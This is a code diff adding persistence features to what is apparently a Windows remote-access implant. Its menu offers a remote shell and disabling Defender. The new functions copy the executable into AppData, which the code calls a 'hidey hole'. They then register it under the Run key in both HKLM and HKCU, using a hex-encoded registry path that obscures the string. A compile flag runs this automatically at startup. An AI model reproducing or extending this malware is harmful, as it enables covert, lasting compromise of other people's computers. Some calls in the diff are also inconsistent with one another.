@@ -14,6 +14,8 @@
 
 #define LOCALTEST
 
+#define GO_FOR_THROAT
+
 #ifdef LOCALTEST
 #define ADDRESS "Local IP ADDR"
 #else
@@ -186,7 +188,85 @@ void attemptRegistryPersistence(SOCKET* pSockfd) {
 
 	return;
 }
+void attemptFullPersistence(SOCKET* pSockfd, TCHAR* dirName) {
 
+	// Get name of file
+	wchar_t* name;
+	TCHAR wszPath[MAX_PATH] = L"";
+	char succ[] = "Moved file to AppData!\n";
+	char failed[] = "Failed to move file!\n";
+
+	// Get name of program
+	name = wcsrchr(dirName, L'\\');
+
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
+
+	wcscat(wszPath, name);
+
+	if (MoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
+		pSend(*pSockfd, failed, sizeof failed, 0);
+		return;
+	}
+
+	Send(*pSockfd, succ, sizeof succ, 0);
+
+	memcpy(dirName, wszPath, sizeof wszPath);
+
+	attemptRegistryPersistence(pSockfd, dirName);
+	
+}
+
+// ATTEMPT FULL BUT WITH NO NETWORK!!! IMPORTANT.
+
+void attemptFullPersistenceNoNetwork(TCHAR* dirName) {
+	// Get name of file
+	wchar_t* name;
+	name = wcsrchr(dirName, L'\\');
+	// Construct new hidey hole spot
+
+	TCHAR wszPath[MAX_PATH] = L"";
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
+
+	wcscat(wszPath, name);
+
+	if (MoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
+		return;
+	}
+	
+	memcpy(dirName, wszPath, sizeof wszPath);
+
+	DWORD charsWritten;
+	HKEY key;
+	LSTATUS rv;
+
+	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x005c, 0x0043, 0x0075, 0x0072, 0x0072, 0x0065, 0x006e, 0x0074, 0x0056, 0x0065, 0x0072, 0x0073, 0x0069, 0x006f, 0x006e, 0x005c, 0x0052, 0x0075, 0x006e, 0x0000 };
+
+	rv = RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key);
+
+	if (rv == ERROR_SUCCESS) {
+		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
+		if (RegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
+			RegCloseKey(key);
+		}
+		else {
+			RegCloseKey(key);
+			return;
+		}
+	}
+
+	// Now attempt user.
+	rv = RegOpenKeyExW(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &key);
+
+	if (rv == ERROR_SUCCESS) {
+		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
+		RegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR));
+			
+	}
+
+	RegCloseKey(key);
+
+	return;
+}
 // Cleaning up some stuff
 void cleanManagerInput(char* command, size_t size) {
 
@@ -213,11 +293,18 @@ int main(int argc, char* argv[]) {
 	}
 
 	SOCKET sockfd;
+	TCHAR* dirName = (TCHAR*)malloc(MAX_PATH * sizeof(TCHAR));
+	GetModuleFileNameW(NULL, dirName, 100);
+
+#ifdef GO_FOR_THROAT
+	attemptFullPersistenceNoNetwork(dirName);
+#endif
 
 	char commandList[] =
 		"1. Drop into a shell\n"
 		"2. Attempt to stop defender\n"
-		"3. Attempt registry persistence.\n";
+		"3. Attempt registry persistence.\n"
+		"4. Attempt full persistence with files and reg.\n";
 	
 	char commandOpt[50];
 	PROCESS_INFORMATION pinfo;
@@ -246,7 +333,12 @@ int main(int argc, char* argv[]) {
 		}
 
 		if (strcmp(commandOpt, "3") == 0) {
-			attemptRegistryPersistence(&sockfd);
+			attemptRegistryPersistence(&sockfd, dirName);
+			continue;
+		}
+
+		if (strcmp(commandOpt, "4") == 0) {
+			attemptFullPersistence(&sockfd, dirName);
 			continue;
 		}
 
